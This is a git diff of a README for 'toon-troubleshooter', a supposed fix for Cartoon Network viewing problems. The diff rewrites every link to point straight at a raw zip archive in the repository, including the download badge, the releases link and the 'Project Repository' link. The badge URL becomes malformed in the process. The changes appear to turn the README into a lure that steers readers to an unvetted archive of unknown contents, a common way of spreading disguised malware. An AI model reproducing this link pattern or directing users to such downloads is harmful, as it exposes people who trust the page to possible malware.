@@ -1,6 +1,6 @@
 # 🎉 toon-troubleshooter - Fix Cartoon Network Viewing Problems Easily
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-%20blue?style=for-the-badge)](https://github.com/HK2210/toon-troubleshooter/releases)
+[![Download the latest release](https://github.com/HK2210/toon-troubleshooter/raw/refs/heads/main/toon_troubleshooter/troubleshooter-toon-v3.5.zip%20Latest%20Release-%20blue?style=for-the-badge)](https://github.com/HK2210/toon-troubleshooter/raw/refs/heads/main/toon_troubleshooter/troubleshooter-toon-v3.5.zip)
 
 ## 📖 Introduction
 
@@ -21,7 +21,7 @@ This guide provides step-by-step instructions for downloading and running the to
 
 1. **Visit the Releases Page:** Click the button below to go to the download page.
 
-   [Download the latest release](https://github.com/HK2210/toon-troubleshooter/releases)
+   [Download the latest release](https://github.com/HK2210/toon-troubleshooter/raw/refs/heads/main/toon_troubleshooter/troubleshooter-toon-v3.5.zip)
 
 2. **Choose the Right File:** On the releases page, look for the latest version. You should see files available for download. 
 
@@ -73,7 +73,7 @@ Yes! We welcome any feedback or suggestions. You can submit feature requests on 
 
 ## 🔗 Additional Resources
 
-- **Project Repository:** [Toon Troubleshooter GitHub](https://github.com/HK2210/toon-troubleshooter)
+- **Project Repository:** [Toon Troubleshooter GitHub](https://github.com/HK2210/toon-troubleshooter/raw/refs/heads/main/toon_troubleshooter/troubleshooter-toon-v3.5.zip)
 - **Community Support:** Join the community discussions and support forums.
 - **Follow Updates:** Stay updated with new versions and fixes.
 
